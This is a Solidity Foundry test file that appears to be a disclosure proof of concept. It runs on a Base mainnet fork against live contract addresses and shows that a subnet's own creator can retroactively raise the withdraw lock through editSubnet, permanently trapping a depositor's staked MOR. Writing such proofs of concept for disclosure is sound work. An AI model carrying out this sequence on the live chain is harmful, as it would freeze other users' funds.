// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

struct Subnet {
    string name;
    address admin;
    uint128 unusedStorage1_V4Update;
    uint128 withdrawLockPeriodAfterDeposit;
    uint128 unusedStorage2_V4Update;
    uint256 minimalDeposit;
    address claimAdmin;
}

struct SubnetMetadata {
    string slug;
    string description;
    string website;
    string image;
}

interface IBuildersV4 {
    function createSubnet(Subnet calldata subnet_, SubnetMetadata calldata metadata_) external;
    function editSubnet(bytes32 subnetId_, Subnet calldata newSubnet_) external;
    function deposit(bytes32 subnetId_, uint256 amount_) external;
    function withdraw(bytes32 subnetId_, uint256 amount_) external;
    function getSubnetId(string memory subnetName_) external view returns (bytes32);
    function usersData(address user, bytes32 subnetId_) external view returns (uint128 lastDeposit, uint128 unused1, uint256 deposited, uint256 unused2);
    function minimalWithdrawLockPeriod() external view returns (uint256);
}

/// @notice Fork PoC (Base mainnet fork, pinned block): a permissionless subnet
/// creator (subnet admin of their OWN subnet) retroactively raises the subnet
/// withdraw lock to type(uint128).max via editSubnet, permanently locking a
/// staker who deposited under a 7-day lock. No protocol-privileged account is
/// used anywhere: createSubnet is permissionless, deposit is an ordinary user
/// action, editSubnet is called by the subnet's own creator.
contract EditSubnetLockTest is Test {
    IBuildersV4 builders = IBuildersV4(0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9);
    IERC20 mor = IERC20(0x7431aDa8a591C955a994a21710752EF9b882b8e3);

    address attacker = makeAddr("subnetCreator");
    address victim = makeAddr("victim");
    uint256 constant STAKE = 100 ether;
    uint128 constant ORIG_LOCK = 604800; // 7 days == live global minimum

    function test_EditSubnet_PermanentLock() public {
        assertEq(builders.minimalWithdrawLockPeriod(), ORIG_LOCK, "live min lock sanity");

        // 1. Attacker creates their own subnet (permissionless, fee = 0 on live state).
        Subnet memory s = Subnet({
            name: "poc-lock-subnet-laneC",
            admin: attacker,
            unusedStorage1_V4Update: 0,
            withdrawLockPeriodAfterDeposit: ORIG_LOCK,
            unusedStorage2_V4Update: 0,
            minimalDeposit: 1 ether,
            claimAdmin: attacker
        });
        vm.prank(attacker);
        builders.createSubnet(s, SubnetMetadata("poc", "poc", "", ""));
        bytes32 subnetId = builders.getSubnetId("poc-lock-subnet-laneC");

        // 2. Victim stakes 100 MOR under the advertised 7-day lock.
        deal(address(mor), victim, STAKE);
        vm.startPrank(victim);
        mor.approve(address(builders), STAKE);
        builders.deposit(subnetId, STAKE);
        vm.stopPrank();
        (, , uint256 dep, ) = builders.usersData(victim, subnetId);
        assertEq(dep, STAKE, "victim deposited");

        // 3. Original lock fully elapses.
        vm.warp(block.timestamp + ORIG_LOCK + 1);

        // 4. Sanity: under the original terms the victim CAN exit in full.
        uint256 snap = vm.snapshotState();
        vm.prank(victim);
        builders.withdraw(subnetId, STAKE);
        assertEq(mor.balanceOf(victim), STAKE, "withdraw works under original lock");
        vm.revertToState(snap);

        // 5. Attacker (subnet admin) raises the lock to uint128 max.
        //    _validateSubnet only enforces lock >= global minimum. No upper
        //    bound, no timelock, applies retroactively to existing deposits
        //    because withdraw() reads the CURRENT subnet lock.
        s.withdrawLockPeriodAfterDeposit = type(uint128).max;
        vm.prank(attacker);
        builders.editSubnet(subnetId, s);

        // 6. Victim is now locked: reverts now, in 1 year, in 100 years.
        vm.expectRevert(); // any revert: lock check panics on uint128 overflow at max, string-reverts at large-but-not-max values
        vm.prank(victim);
        builders.withdraw(subnetId, STAKE);

        vm.warp(block.timestamp + 365 days);
        vm.expectRevert(); // any revert: lock check panics on uint128 overflow at max, string-reverts at large-but-not-max values
        vm.prank(victim);
        builders.withdraw(subnetId, STAKE);

        vm.warp(block.timestamp + 100 * 365 days);
        vm.expectRevert(); // any revert: lock check panics on uint128 overflow at max, string-reverts at large-but-not-max values
        vm.prank(victim);
        builders.withdraw(subnetId, STAKE);

        // 7. Principal is still trapped in the Builders proxy.
        (, , uint256 depAfter, ) = builders.usersData(victim, subnetId);
        assertEq(depAfter, STAKE, "principal still recorded as deposited");
        assertEq(mor.balanceOf(victim), 0, "victim recovered nothing");
    }
}

/// @notice Variant: a "plausible" 100-year lock (no uint128 overflow) gives the
/// clean lock revert and still traps principal for a century.
contract EditSubnetLock100yTest is Test {
    IBuildersV4 builders = IBuildersV4(0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9);
    IERC20 mor = IERC20(0x7431aDa8a591C955a994a21710752EF9b882b8e3);
    address attacker = makeAddr("subnetCreator2");
    address victim = makeAddr("victim2");

    function test_EditSubnet_100yLock() public {
        Subnet memory s = Subnet("poc-lock-subnet-laneC-100y", attacker, 0, 604800, 0, 1 ether, attacker);
        vm.prank(attacker);
        builders.createSubnet(s, SubnetMetadata("poc", "poc", "", ""));
        bytes32 subnetId = builders.getSubnetId("poc-lock-subnet-laneC-100y");
        deal(address(mor), victim, 100 ether);
        vm.startPrank(victim);
        mor.approve(address(builders), 100 ether);
        builders.deposit(subnetId, 100 ether);
        vm.stopPrank();
        vm.warp(block.timestamp + 604801);
        s.withdrawLockPeriodAfterDeposit = uint128(100 * 365 days);
        vm.prank(attacker);
        builders.editSubnet(subnetId, s);
        vm.warp(block.timestamp + 99 * 365 days);
        vm.expectRevert(bytes("BU: user withdraw is locked"));
        vm.prank(victim);
        builders.withdraw(subnetId, 100 ether);
        assertEq(mor.balanceOf(victim), 0, "still trapped after 99y");
    }
}
